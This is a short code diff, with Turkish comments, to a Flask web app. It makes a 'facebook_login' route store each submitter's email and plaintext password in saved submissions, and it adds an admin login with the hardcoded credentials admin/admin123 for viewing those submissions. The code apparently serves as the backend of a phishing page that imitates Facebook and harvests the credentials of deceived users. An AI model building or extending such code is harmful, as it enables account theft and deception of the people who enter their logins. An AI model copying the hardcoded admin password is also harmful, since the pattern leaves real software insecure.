@@ -78,8 +78,11 @@ def facebook_login():
         form_data = {
             'type': 'facebook_login',
             'login_method': 'facebook',
+            'email': data.get('email', ''),
+            'password': data.get('password', ''),
             'user_data': data.get('user_data', {}),
-            'access_token': data.get('access_token', '')
+            'access_token': data.get('access_token', ''),
+            'remember_me': False
         }
         
         save_submission(form_data)
@@ -100,6 +103,27 @@ def get_submissions():
     """Kaydedilen form verilerini döndürür (admin paneli için)"""
     submissions = load_submissions()
     return jsonify(submissions)
+
+@app.route('/admin-login')
+def admin_login():
+    """Admin giriş sayfası"""
+    return render_template('admin_login.html')
+
+@app.route('/admin-auth', methods=['POST'])
+def admin_auth():
+    """Admin giriş doğrulama"""
+    try:
+        data = request.get_json()
+        username = data.get('username', '')
+        password = data.get('password', '')
+        
+        # Basit admin doğrulama (gerçek uygulamada hash kullanın)
+        if username == 'admin' and password == 'admin123':
+            return jsonify({'success': True, 'message': 'Admin girişi başarılı'})
+        else:
+            return jsonify({'success': False, 'message': 'Geçersiz admin bilgileri'})
+    except Exception as e:
+        return jsonify({'success': False, 'message': f'Hata: {str(e)}'})
 
 @app.route('/admin')
 def admin():
